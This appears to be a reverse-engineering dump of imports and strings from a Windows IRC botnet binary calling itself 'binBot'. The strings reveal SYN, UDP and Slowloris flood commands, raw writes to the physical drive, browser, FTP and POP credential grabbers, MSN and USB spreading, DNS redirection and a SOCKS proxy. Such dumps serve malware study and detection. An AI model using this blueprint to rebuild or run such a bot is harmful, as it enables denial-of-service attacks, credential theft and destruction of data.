reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x182495fc	0x18251120	import	0x18249580	KERNEL32.dll.lstrcpyA
0x18249602	0x182529e0	string	0x18249580	Mozilla/4.0
0x1824963c	0x182529d8	string	0x18249580	POST
0x1824964a	0x182529d8	string	0x18249580	POST
0x1824967f	0x18252968	string	0x18249580	%s / ?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nKeep-Alive: 300\r\nConnection: keep-alive\r\nContent-Length: 42\r\n
0x1824970b	0x18251180	import	0x182496b0	KERNEL32.dll.HeapFree
0x18249728	0x182510a0	import	0x182496b0	KERNEL32.dll.lstrcpynA
0x18249751	0x18251180	import	0x182496b0	KERNEL32.dll.HeapFree
0x18249770	0x18251174	import	0x182496b0	KERNEL32.dll.GetTickCount
0x182497ba	0x18255ee4	string	0x182496b0	[SYN]: Starting flood on "%s:%d" for %d second(s)
0x182497f0	0x18255f18	string	0x182496b0	[SYN]: Finished flood on "%s:%d"
0x1824981c	0x18251180	import	0x182496b0	KERNEL32.dll.HeapFree
0x1824988b	0x18251180	import	0x18249830	KERNEL32.dll.HeapFree
0x182498a8	0x182510a0	import	0x18249830	KERNEL32.dll.lstrcpynA
0x182498d1	0x18251180	import	0x18249830	KERNEL32.dll.HeapFree
0x182498f0	0x18251174	import	0x18249830	KERNEL32.dll.GetTickCount
0x1824993a	0x18255e8c	string	0x18249830	[UDP]: Starting flood on "%s:%d" for %d second(s)
0x18249970	0x18255ec0	string	0x18249830	[UDP]: Finished flood on "%s:%d"
0x1824999c	0x18251180	import	0x18249830	KERNEL32.dll.HeapFree
0x18249a2d	0x18251174	import	0x182499b0	KERNEL32.dll.GetTickCount
0x18249a60	0x18251174	import	0x182499b0	KERNEL32.dll.GetTickCount
0x18249abe	0x18251188	import	0x182499b0	KERNEL32.dll.Sleep
0x18249ae7	0x18251120	import	0x182499b0	KERNEL32.dll.lstrcpyA
0x18249af0	0x18252a08	string	0x182499b0	X-a: b\r\n
0x18249b00	0x182529f0	string	0x182499b0	Connection: Close\r\n\r\n
0x18249b0f	0x18251184	import	0x182499b0	KERNEL32.dll.lstrlenA
0x18249b51	0x18251188	import	0x182499b0	KERNEL32.dll.Sleep
0x18249b5e	0x18251184	import	0x182499b0	KERNEL32.dll.lstrlenA
0x18249b66	0x18251174	import	0x182499b0	KERNEL32.dll.GetTickCount
0x18249b7f	0x18251188	import	0x182499b0	KERNEL32.dll.Sleep
0x18249bd2	0x18251174	import	0x182499b0	KERNEL32.dll.GetTickCount
0x18249be4	0x18251184	import	0x182499b0	KERNEL32.dll.lstrlenA
0x18249c43	0x18251174	import	0x182499b0	KERNEL32.dll.GetTickCount
0x18249c9a	0x18251180	import	0x18249c60	KERNEL32.dll.HeapFree
0x18249cb3	0x18251120	import	0x18249c60	KERNEL32.dll.lstrcpyA
0x18249cc4	0x182510a0	import	0x18249c60	KERNEL32.dll.lstrcpynA
0x18249cf9	0x18255e30	string	0x18249c60	[Slowloris]: Starting flood on "%s" for %d minute(s)
0x18249d45	0x18255e68	string	0x18249c60	[Slowloris]: Finished flood on "%s"
0x18249d73	0x18251180	import	0x18249c60	KERNEL32.dll.HeapFree
0x18249da7	0x18251094	import	0x18249d90	KERNEL32.dll.VirtualAlloc
0x18249dd0	0x18252a14	string	0x18249d90	\\.\PHYSICALDRIVE0
0x18249dd5	0x18251110	import	0x18249d90	KERNEL32.dll.CreateFileA
0x18249e02	0x18251098	import	0x18249d90	KERNEL32.dll.DeviceIoControl
0x18249e21	0x1825109c	import	0x18249d90	KERNEL32.dll.SetFilePointer
0x18249e2a	0x18251164	import	0x18249d90	KERNEL32.dll.WriteFile
0x18249e56	0x1825109c	import	0x18249d90	KERNEL32.dll.SetFilePointer
0x18249ea2	0x18251098	import	0x18249d90	KERNEL32.dll.DeviceIoControl
0x18249eec	0x18252a28	string	0x18249ec0	00100
0x18249f09	0x18252a14	string	0x18249ec0	\\.\PHYSICALDRIVE0
0x18249f16	0x18251110	import	0x18249ec0	KERNEL32.dll.CreateFileA
0x18249f2b	0x18251098	import	0x18249ec0	KERNEL32.dll.DeviceIoControl
0x18249f5a	0x18251164	import	0x18249ec0	KERNEL32.dll.WriteFile
0x18249f77	0x18251150	import	0x18249ec0	KERNEL32.dll.CloseHandle
0x1824a0a2	0x18251158	import	0x1824a080	KERNEL32.dll.CreateFileW
0x1824a0c0	0x18251164	import	0x1824a080	KERNEL32.dll.WriteFile
0x1824a0cb	0x18251150	import	0x1824a080	KERNEL32.dll.CloseHandle
0x1824a0d8	0x18251150	import	0x1824a080	KERNEL32.dll.CloseHandle
0x1824a184	0x182510c8	import	0x1824a150	KERNEL32.dll.GetWindowsDirectoryW
0x1824a2ab	0x18251090	import	0x1824a260	KERNEL32.dll.CreateProcessW
0x1824a2c5	0x18251174	import	0x1824a2c0	KERNEL32.dll.GetTickCount
0x1824a39f	0x18251184	import	0x1824a310	KERNEL32.dll.lstrlenA
0x1824a3a8	0x182557a0	string	0x1824a310	30e42~a1
0x1824a3b0	0x182557a0	string	0x1824a310	30e42~a1
0x1824a3bb	0x18256904	string	0x1824a310	\\.\pipe\%08x_ipc
0x1824a3fd	0x182557a0	string	0x1824a310	30e42~a1
0x1824a40e	0x182557a0	string	0x1824a310	30e42~a1
0x1824a436	0x1825119c	import	0x1824a310	KERNEL32.dll.EnterCriticalSection
0x1824a452	0x18251110	import	0x1824a310	KERNEL32.dll.CreateFileA
0x1824a464	0x18251198	import	0x1824a310	KERNEL32.dll.LeaveCriticalSection
0x1824a484	0x18251164	import	0x1824a310	KERNEL32.dll.WriteFile
0x1824a48b	0x18251150	import	0x1824a310	KERNEL32.dll.CloseHandle
0x1824a496	0x18251188	import	0x1824a310	KERNEL32.dll.Sleep
0x1824a4a1	0x18251198	import	0x1824a310	KERNEL32.dll.LeaveCriticalSection
0x1824a557	0x18252a48	string	0x1824a550	NtShutdownSystem
0x1824a55c	0x182516e8	string	0x1824a550	ntdll.dll
0x1824a57a	0x18251024	import	0x1824a550	ADVAPI32.dll.OpenProcessToken
0x1824a588	0x18252a34	string	0x1824a550	SeShutdownPrivilege
0x1824a58f	0x18251028	import	0x1824a550	ADVAPI32.dll.LookupPrivilegeValueA
0x1824a5b3	0x1825102c	import	0x1824a550	ADVAPI32.dll.AdjustTokenPrivileges
0x1824a5b9	0x1825116c	import	0x1824a550	KERNEL32.dll.GetLastError
0x1824a659	0x182510cc	import	0x1824a5d0	KERNEL32.dll.CreateThread
0x1824a661	0x18252ad4	string	0x1824a5d0	binBot Error
0x1824a666	0x18252a60	string	0x1824a5d0	This binary is invalid.\r\n\r\nMain reasons:\r\n- you stupid cracker\r\n- you stupid cracker...\r\n- you stupid cracker?!\r\n
0x1824a66f	0x182512a4	import	0x1824a5d0	USER32.dll.MessageBoxA
0x1824a678	0x182510f8	import	0x1824a5d0	KERNEL32.dll.WaitForSingleObject
0x1824a680	0x1825108c	import	0x1824a5d0	KERNEL32.dll.ExitProcess
0x1824a6df	0x18251238	import	0x1824a690	SHELL32.dll.SHGetSpecialFolderPathW
0x1824a6f9	0x18251240	import	0x1824a690	SHLWAPI.dll.PathAppendW
0x1824a70a	0x18252af0	string	0x1824a690	"%s" %S
0x1824a77f	0x18251090	import	0x1824a690	KERNEL32.dll.CreateProcessW
0x1824a7aa	0x18251174	import	0x1824a790	KERNEL32.dll.GetTickCount
0x1824a7dc	0x18251188	import	0x1824a790	KERNEL32.dll.Sleep
0x1824a819	0x18251174	import	0x1824a800	KERNEL32.dll.GetTickCount
0x1824a859	0x18251188	import	0x1824a800	KERNEL32.dll.Sleep
0x1824a8b1	0x18251534	string	0x1824a880	msnu
0x1824a8bd	0x18251330	string	0x1824a880	pdef
0x1824a8c9	0x18251b04	string	0x1824a880	ffgrab
0x1824a8d5	0x18251b0c	string	0x1824a880	iegrab
0x1824a8e1	0x18251a9c	string	0x1824a880	ftpgrab
0x1824a8ed	0x18251a68	string	0x1824a880	popgrab
0x1824a8fc	0x182513e4	string	0x1824a880	bdns
0x1824a908	0x18252b1c	string	0x1824a880	usbi
0x1824a914	0x18252b14	string	0x1824a880	httpi
0x1824a946	0x18252b04	string	0x1824a880	http
0x1824a956	0x18252b04	string	0x1824a880	http
0x1824a970	0x18252b30	string	0x1824a970	DnsFlushResolverCache
0x1824a975	0x18252b24	string	0x1824a970	dnsapi.dll
0x1824a9ed	0x18251090	import	0x1824a990	KERNEL32.dll.CreateProcessW
0x1824aa39	0x182529e0	string	0x1824aa10	Mozilla/4.0
0x1824aa45	0x18251120	import	0x1824aa10	KERNEL32.dll.lstrcpyA
0x1824aa60	0x182512b8	import	0x1824aa10	WININET.dll.InternetOpenA
0x1824aa78	0x18251184	import	0x1824aa10	KERNEL32.dll.lstrlenA
0x1824aa8c	0x182512b4	import	0x1824aa10	WININET.dll.InternetOpenUrlA
0x1824aac0	0x182512b0	import	0x1824aa10	WININET.dll.HttpQueryInfoA
0x1824aae2	0x182512ac	import	0x1824aa10	WININET.dll.InternetQueryDataAvailable
0x1824ab00	0x182512c8	import	0x1824aa10	WININET.dll.InternetReadFile
0x1824abe7	0x182512c4	import	0x1824aa10	WININET.dll.InternetCloseHandle
0x1824ac1a	0x18251178	import	0x1824ac00	KERNEL32.dll.HeapAlloc
0x1824ac29	0x182512bc	import	0x1824ac00	WININET.dll.HttpQueryInfoW
0x1824ac44	0x1825116c	import	0x1824ac00	KERNEL32.dll.GetLastError
0x1824ac5e	0x182511a0	import	0x1824ac00	KERNEL32.dll.HeapReAlloc
0x1824ac80	0x18252b48	string	0x1824ac00	POST
0x1824ac85	0x18251134	import	0x1824ac00	KERNEL32.dll.lstrcmpW
0x1824ac99	0x18251180	import	0x1824ac00	KERNEL32.dll.HeapFree
0x1824acb2	0x18251180	import	0x1824ac00	KERNEL32.dll.HeapFree
0x1824ad0a	0x18251178	import	0x1824acd0	KERNEL32.dll.HeapAlloc
0x1824ad1a	0x182512c0	import	0x1824acd0	WININET.dll.InternetQueryOptionW
0x1824ad31	0x1825116c	import	0x1824acd0	KERNEL32.dll.GetLastError
0x1824ad4f	0x182511a0	import	0x1824acd0	KERNEL32.dll.HeapReAlloc
0x1824ad80	0x1825112c	import	0x1824acd0	KERNEL32.dll.WideCharToMultiByte
0x1824adb3	0x18251120	import	0x1824acd0	KERNEL32.dll.lstrcpyA
0x1824ade6	0x18251180	import	0x1824acd0	KERNEL32.dll.HeapFree
0x1824ae05	0x18251184	import	0x1824ae00	KERNEL32.dll.lstrlenA
0x1824ae13	0x18251178	import	0x1824ae00	KERNEL32.dll.HeapAlloc
0x1824ae69	0x18251120	import	0x1824ae00	KERNEL32.dll.lstrcpyA
0x1824ae7f	0x18251088	import	0x1824ae00	KERNEL32.dll.lstrcatA
0x1824aeb0	0x1824af0a	string	0x1824ae00	hT+%
0x1824aed5	0x18251180	import	0x1824ae00	KERNEL32.dll.HeapFree
0x1824aeeb	0x18251180	import	0x1824ae00	KERNEL32.dll.HeapFree
0x1824af58	0x18251120	import	0x1824ae00	KERNEL32.dll.lstrcpyA
0x1824af70	0x18251180	import	0x1824ae00	KERNEL32.dll.HeapFree
0x1824afaf	0x18251184	import	0x1824afa0	KERNEL32.dll.lstrlenA
0x1824afcb	0x18251178	import	0x1824afa0	KERNEL32.dll.HeapAlloc
0x1824b024	0x18252b88	string	0x1824afa0	POST /%1023s
0x1824b055	0x18252b7c	string	0x1824afa0	Host:
0x1824b08e	0x182510a0	import	0x1824afa0	KERNEL32.dll.lstrcpynA
0x1824b0d5	0x18251178	import	0x1824afa0	KERNEL32.dll.HeapAlloc
0x1824b0e3	0x18252b74	string	0x1824afa0	HTTP
0x1824b0ff	0x18252b68	string	0x1824afa0	http://%s/
0x1824b11e	0x18252b58	string	0x1824afa0	http://%s/%s
0x1824b13c	0x18251180	import	0x1824afa0	KERNEL32.dll.HeapFree
0x1824b16a	0x18251184	import	0x1824b160	KERNEL32.dll.lstrlenA
0x1824b186	0x18251178	import	0x1824b160	KERNEL32.dll.HeapAlloc
0x1824b199	0x18252b98	string	0x1824b160	\r\n\r\n
0x1824b1d2	0x18251178	import	0x1824b160	KERNEL32.dll.HeapAlloc
0x1824b1e5	0x182510a0	import	0x1824b160	KERNEL32.dll.lstrcpynA
0x1824b1f8	0x18251180	import	0x1824b160	KERNEL32.dll.HeapFree
0x1824b2ee	0x1824b2b0	string	0x1824b290	<%u2
0x1824b312	0x1825117c	import	0x1824b300	KERNEL32.dll.GetProcessHeap
0x1824b319	0x18251178	import	0x1824b300	KERNEL32.dll.HeapAlloc
0x1824b366	0x18252bb4	string	0x1824b300	lol.exe
0x1824b387	0x182510c8	import	0x1824b300	KERNEL32.dll.GetWindowsDirectoryW
0x1824b3a1	0x182510b8	import	0x1824b300	KERNEL32.dll.lstrcpynW
0x1824b3bb	0x18251084	import	0x1824b300	KERNEL32.dll.GetVolumeInformationW
0x1824b3cd	0x18251184	import	0x1824b300	KERNEL32.dll.lstrlenA
0x1824b3d3	0x182557a0	string	0x1824b300	30e42~a1
0x1824b3ea	0x182557a0	string	0x1824b300	30e42~a1
0x1824b45b	0x18252ba0	string	0x1824b300	.exe
0x1824b461	0x182510bc	import	0x1824b300	KERNEL32.dll.lstrcatW
0x1824b4a9	0x18252c18	string	0x1824b480	isadmin
0x1824b4ae	0x18252c10	string	0x1824b480	admin
0x1824b4fe	0x18251120	import	0x1824b480	KERNEL32.dll.lstrcpyA
0x1824b536	0x18251178	import	0x1824b480	KERNEL32.dll.HeapAlloc
0x1824b550	0x182510d8	import	0x1824b480	KERNEL32.dll.GetVersionExA
0x1824b60d	0x18251178	import	0x1824b480	KERNEL32.dll.HeapAlloc
0x1824b620	0x182568e8	string	0x1824b480	http://api.wipmania.com/
0x1824b63b	0x18252be8	string	0x1824b480	<br>
0x1824b650	0x18251184	import	0x1824b480	KERNEL32.dll.lstrlenA
0x1824b65f	0x18251184	import	0x1824b480	KERNEL32.dll.lstrlenA
0x1824b67d	0x18251080	import	0x1824b480	KERNEL32.dll.GetLocaleInfoA
0x1824b6a8	0x18251128	import	0x1824b480	KERNEL32.dll.lstrcmpA
0x1824b6c5	0x18251080	import	0x1824b480	KERNEL32.dll.GetLocaleInfoA
0x1824b6f9	0x18251080	import	0x1824b480	KERNEL32.dll.GetLocaleInfoA
0x1824b741	0x18251178	import	0x1824b480	KERNEL32.dll.HeapAlloc
0x1824b7f1	0x18252bd0	string	0x1824b480	n%s[%s{%s%s{%s
0x1824b80b	0x18252bc4	string	0x1824b480	[%s{%s%s{%s
0x1824b8be	0x18252bd0	string	0x1824b480	n%s[%s{%s%s{%s
0x1824b8d5	0x18252bc4	string	0x1824b480	[%s{%s%s{%s
0x1824b94b	0x18252c20	string	0x1824b900	127.0.0.1
0x1824b975	0x18251188	import	0x1824b900	KERNEL32.dll.Sleep
0x1824b9bc	0x1825119c	import	0x1824b990	KERNEL32.dll.EnterCriticalSection
0x1824b9d1	0x182512a0	import	0x1824b990	USER32.dll.wvsprintfA
0x1824b9f2	0x18251198	import	0x1824b990	KERNEL32.dll.LeaveCriticalSection
0x1824ba42	0x182512a0	import	0x1824ba00	USER32.dll.wvsprintfA
0x1824ba56	0x18255d4c	string	0x1824ba00	PPPPMSG %s :%s\r\n
0x1824ba7f	0x18255c54	string	0x1824ba70	PASS %s\r\n
0x1824ba9c	0x18255d24	string	0x1824ba70	KCIK %s\r\n
0x1824bab4	0x18255d10	string	0x1824ba70	SSRR %s 0 0 :%s\r\n
0x1824bb52	0x18251184	import	0x1824bb30	KERNEL32.dll.lstrlenA
0x1824bba0	0x18251128	import	0x1824bb80	KERNEL32.dll.lstrcmpA
0x1824bbff	0x18251128	import	0x1824bbb0	KERNEL32.dll.lstrcmpA
0x1824bc2c	0x182557a0	string	0x1824bbb0	30e42~a1
0x1824bc36	0x18255d88	string	0x1824bbb0	[v="%s" c="%s" h="%s" p="%S"]
0x1824bc89	0x18252cf4	string	0x1824bbb0	reconnecting
0x1824bc8e	0x18255d60	string	0x1824bbb0	QUIT :%s\r\n
0x1824bcc3	0x18251184	import	0x1824bbb0	KERNEL32.dll.lstrlenA
0x1824bce1	0x18251180	import	0x1824bbb0	KERNEL32.dll.HeapFree
0x1824bcec	0x18252cf4	string	0x1824bbb0	reconnecting
0x1824bcf1	0x18255d60	string	0x1824bbb0	QUIT :%s\r\n
0x1824bd28	0x18252ce8	string	0x1824bbb0	exiting
0x1824bd2d	0x18255d60	string	0x1824bbb0	QUIT :%s\r\n
0x1824bd5a	0x18252cdc	string	0x1824bbb0	removing
0x1824bd5f	0x18255d60	string	0x1824bbb0	QUIT :%s\r\n
0x1824bdb2	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824bdc6	0x18251088	import	0x1824bbb0	KERNEL32.dll.lstrcatA
0x1824bdd5	0x18255d30	string	0x1824bbb0	SEND %s %s\r\n
0x1824be0c	0x18252ccc	string	0x1824bbb0	#new
0x1824be18	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824be2a	0x18255d30	string	0x1824bbb0	SEND %s %s\r\n
0x1824be72	0x18252cbc	string	0x1824bbb0	#admin
0x1824be79	0x18252cb4	string	0x1824bbb0	#user
0x1824be7f	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824be91	0x18255d30	string	0x1824bbb0	SEND %s %s\r\n
0x1824becb	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824bee7	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824befa	0x18251088	import	0x1824bbb0	KERNEL32.dll.lstrcatA
0x1824bf0c	0x18255d30	string	0x1824bbb0	SEND %s %s\r\n
0x1824bf5f	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824bf73	0x18251088	import	0x1824bbb0	KERNEL32.dll.lstrcatA
0x1824bf82	0x18255d40	string	0x1824bbb0	PART %s\r\n
0x1824bfa6	0x18252ccc	string	0x1824bbb0	#new
0x1824bfb2	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824bfc4	0x18255d40	string	0x1824bbb0	PART %s\r\n
0x1824c00c	0x18252cbc	string	0x1824bbb0	#admin
0x1824c013	0x18252cb4	string	0x1824bbb0	#user
0x1824c019	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824c02b	0x18255d40	string	0x1824bbb0	PART %s\r\n
0x1824c065	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824c081	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824c094	0x18251088	import	0x1824bbb0	KERNEL32.dll.lstrcatA
0x1824c0a6	0x18255d40	string	0x1824bbb0	PART %s\r\n
0x1824c0c3	0x18255874	string	0x1824bbb0	stop
0x1824c0e3	0x18255840	string	0x1824bbb0	stats
0x1824c124	0x18256054	string	0x1824bbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0x1824c156	0x18256080	string	0x1824bbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0x1824c192	0x18256054	string	0x1824bbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0x1824c1b9	0x18256080	string	0x1824bbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0x1824c1d2	0x18255850	string	0x1824bbb0	logins
0x1824c225	0x18251180	import	0x1824bbb0	KERNEL32.dll.HeapFree
0x1824c25e	0x18252c88	string	0x1824bbb0	[Logins]: Cleared %d logins
0x1824c283	0x18252c80	string	0x1824bbb0	%s|%s
0x1824c2c2	0x18251184	import	0x1824bbb0	KERNEL32.dll.lstrlenA
0x1824c2d2	0x18251178	import	0x1824bbb0	KERNEL32.dll.HeapAlloc
0x1824c2ea	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824c321	0x182560d0	string	0x1824bbb0	[RSOCK4]: Stopped rsock4
0x1824c33f	0x18255848	string	0x1824bbb0	speed
0x1824c354	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824c3fd	0x182557f0	string	0x1824bbb0	jps獵 blocks=Basic Latin,CJK Unified Ideographs
0x1824c449	0x18255d30	string	0x1824bbb0	SEND %s %s\r\n
0x1824c4bf	0x18255d30	string	0x1824bbb0	SEND %s %s\r\n
0x1824c550	0x18255d40	string	0x1824bbb0	PART %s\r\n
0x1824c572	0x18255d40	string	0x1824bbb0	PART %s\r\n
0x1824c5d0	0x18251330	string	0x1824bbb0	pdef
0x1824c5e2	0x18251184	import	0x1824bbb0	KERNEL32.dll.lstrlenA
0x1824c5f7	0x18251178	import	0x1824bbb0	KERNEL32.dll.HeapAlloc
0x1824c60e	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824c61f	0x18251184	import	0x1824bbb0	KERNEL32.dll.lstrlenA
0x1824c633	0x18251088	import	0x1824bbb0	KERNEL32.dll.lstrcatA
0x1824c642	0x18251088	import	0x1824bbb0	KERNEL32.dll.lstrcatA
0x1824c679	0x18251330	string	0x1824bbb0	pdef
0x1824c68f	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824c6d0	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824c6e0	0x18251184	import	0x1824bbb0	KERNEL32.dll.lstrlenA
0x1824c706	0x18251088	import	0x1824bbb0	KERNEL32.dll.lstrcatA
0x1824c73d	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824c743	0x18251184	import	0x1824bbb0	KERNEL32.dll.lstrlenA
0x1824c77e	0x182514f8	string	0x1824bbb0	msnmsg
0x1824c7ce	0x18255f50	string	0x1824bbb0	[MSN]: Updated MSN spread message to "%s"
0x1824c7e7	0x18255808	string	0x1824bbb0	msn.int
0x1824c826	0x18251500	string	0x1824bbb0	msnint
0x1824c859	0x18251184	import	0x1824bbb0	KERNEL32.dll.lstrlenA
0x1824c876	0x18255f7c	string	0x1824bbb0	[MSN]: Updated MSN spread interval to "%s"
0x1824c88f	0x18255810	string	0x1824bbb0	http.set
0x1824c8b5	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824c8d0	0x18251184	import	0x1824bbb0	KERNEL32.dll.lstrlenA
0x1824c8f5	0x18251088	import	0x1824bbb0	KERNEL32.dll.lstrcatA
0x1824c92c	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824c955	0x18252b04	string	0x1824bbb0	http
0x1824c972	0x18255fa8	string	0x1824bbb0	[HTTP]: Updated HTTP spread message to "%s"
0x1824c97f	0x1825581c	string	0x1824bbb0	http.int
0x1824c9c0	0x18252b04	string	0x1824bbb0	http
0x1824c9df	0x18255ff8	string	0x1824bbb0	[HTTP]: Updated HTTP spread interval to "%s"
0x1824c9f8	0x18255828	string	0x1824bbb0	http.inj
0x1824ca16	0x18252b14	string	0x1824bbb0	httpi
0x1824ca26	0x18252c70	string	0x1824bbb0	enabled
0x1824ca2b	0x18255fd4	string	0x1824bbb0	[HTTP]: Injected value is now %s.
0x1824ca43	0x18252b14	string	0x1824bbb0	httpi
0x1824ca53	0x18252c64	string	0x1824bbb0	disabled
0x1824ca58	0x18255fd4	string	0x1824bbb0	[HTTP]: Injected value is now %s.
0x1824ca71	0x18255838	string	0x1824bbb0	mdns
0x1824ca9f	0x18251184	import	0x1824bbb0	KERNEL32.dll.lstrlenA
0x1824cadd	0x18251178	import	0x1824bbb0	KERNEL32.dll.HeapAlloc
0x1824caf3	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824cb36	0x182513e4	string	0x1824bbb0	bdns
0x1824cb41	0x1824a970	string	0x1824bbb0	h0+%
0x1824cb56	0x18252c44	string	0x1824bbb0	[DNS]: Redirecting "%s" to "%s"
0x1824cb76	0x182513e4	string	0x1824bbb0	bdns
0x1824cb7b	0x182513dc	string	0x1824bbb0	block
0x1824cb85	0x1824a970	string	0x1824bbb0	h0+%
0x1824cb95	0x18256040	string	0x1824bbb0	[DNS]: Blocked "%s"
0x1824cbf2	0x1824cc0a	string	0x1824bbb0	h|b%
0x1824cbf4	0x18256028	string	0x1824bbb0	[Visit]: Visited "%s"
0x1824cc0a	0x1825627c	string	0x1824bbb0	[Visit]: Error visitng "%s"
0x1824cc3a	0x18251184	import	0x1824bbb0	KERNEL32.dll.lstrlenA
0x1824cc8b	0x18252c34	string	0x1824bbb0	%s[%s{%s
0x1824cca8	0x18252c80	string	0x1824bbb0	%s|%s
0x1824ccd4	0x18251178	import	0x1824bbb0	KERNEL32.dll.HeapAlloc
0x1824cce4	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824cd11	0x18255860	string	0x1824bbb0	slow
0x1824cd27	0x18252c80	string	0x1824bbb0	%s|%s
0x1824cd47	0x18251184	import	0x1824bbb0	KERNEL32.dll.lstrlenA
0x1824cd58	0x18251178	import	0x1824bbb0	KERNEL32.dll.HeapAlloc
0x1824cd70	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824cdfc	0x18251534	string	0x1824bbb0	msnu
0x1824ce55	0x18251330	string	0x1824bbb0	pdef
0x1824ce66	0x18251b04	string	0x1824bbb0	ffgrab
0x1824ce7b	0x18251b0c	string	0x1824bbb0	iegrab
0x1824ce8c	0x18251a9c	string	0x1824bbb0	ftpgrab
0x1824ce9d	0x18251a68	string	0x1824bbb0	popgrab
0x1824ceb2	0x182513e4	string	0x1824bbb0	bdns
0x1824cec7	0x18252b1c	string	0x1824bbb0	usbi
0x1824cf67	0x182560ac	string	0x1824bbb0	[RSOCK4]: Started rsock4 on "%s:%d"
0x1824cfe3	0x18252c34	string	0x1824bbb0	%s[%s{%s
0x1824d003	0x18251184	import	0x1824bbb0	KERNEL32.dll.lstrlenA
0x1824d013	0x18251178	import	0x1824bbb0	KERNEL32.dll.HeapAlloc
0x1824d02b	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824d043	0x18255868	string	0x1824bbb0	ssyn
0x1824d097	0x18252c34	string	0x1824bbb0	%s[%s{%s
0x1824d0b7	0x18251184	import	0x1824bbb0	KERNEL32.dll.lstrlenA
0x1824d0c8	0x18251178	import	0x1824bbb0	KERNEL32.dll.HeapAlloc
0x1824d0dc	0x18251120	import	0x1824bbb0	KERNEL32.dll.lstrcpyA
0x1824d0f0	0x182510cc	import	0x1824bbb0	KERNEL32.dll.CreateThread
0x1824d0f7	0x18251150	import	0x1824bbb0	KERNEL32.dll.CloseHandle
0x1824d145	0x18251128	import	0x1824d110	KERNEL32.dll.lstrcmpA
0x1824d18c	0x182510a0	import	0x1824d110	KERNEL32.dll.lstrcpynA
0x1824d198	0x18251184	import	0x1824d110	KERNEL32.dll.lstrlenA
0x1824d231	0x18251184	import	0x1824d220	KERNEL32.dll.lstrlenA
0x1824d243	0x18252d18	string	0x1824d220	MOTD
0x1824d2b5	0x18251128	import	0x1824d220	KERNEL32.dll.lstrcmpA
0x1824d2bb	0x18255d78	string	0x1824d220	PING
0x1824d2d1	0x18255d6c	string	0x1824d220	PPNG %s\r\n
0x1824d2f6	0x1824d31d	string	0x1824d220	h\f-%
0x1824d308	0x18255d30	string	0x1824d220	SEND %s %s\r\n
0x1824d33c	0x18255d24	string	0x1824d220	KCIK %s\r\n
0x1824d351	0x182518c4	string	0x1824d220	JOIN
0x1824d37f	0x18255d80	string	0x1824d220	PPPPMSG
0x1824d43c	0x18255d30	string	0x1824d220	SEND %s %s\r\n
0x1824d5cd	0x182518d0	string	0x1824d530	%s:%d
0x1824d5e4	0x18251188	import	0x1824d530	KERNEL32.dll.Sleep
0x1824d659	0x18251188	import	0x1824d530	KERNEL32.dll.Sleep
